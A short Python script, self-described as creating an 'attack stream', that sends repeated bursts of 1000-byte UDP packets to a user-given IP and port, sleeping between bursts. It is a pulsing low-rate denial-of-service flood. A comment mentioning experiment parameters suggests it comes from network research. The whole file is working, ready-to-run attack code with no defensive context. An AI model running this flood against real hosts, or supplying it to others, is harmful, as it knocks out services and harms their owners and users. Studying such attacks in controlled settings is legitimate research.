import socket
from time import time, sleep
from argparse import ArgumentParser
import sys
import os

parser = ArgumentParser(description="Create attack stream")

parser.add_argument('--target', '-T',
                    help="IP of target",
                    required = True)

parser.add_argument('--port', '-P',
                    type=int,
                    help="Port of target",
                    required = True)

parser.add_argument('--blen', '-B',
                    type=int,
                    help="Burst lenght in ms",
                    default = 130)

parser.add_argument('--plen', '-L',
                    type=int,
                    help="Length of one period",
                    default = 1100)

# Expt parameters
args = parser.parse_args()

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

payload = 'a' * 1000

while True:
    now = int(time() * 1000)
    while int(time() * 1000) - now < args.blen:
        s.sendto(payload, (args.target, args.port))
    sleep(float(args.plen - args.blen)/1000.0)
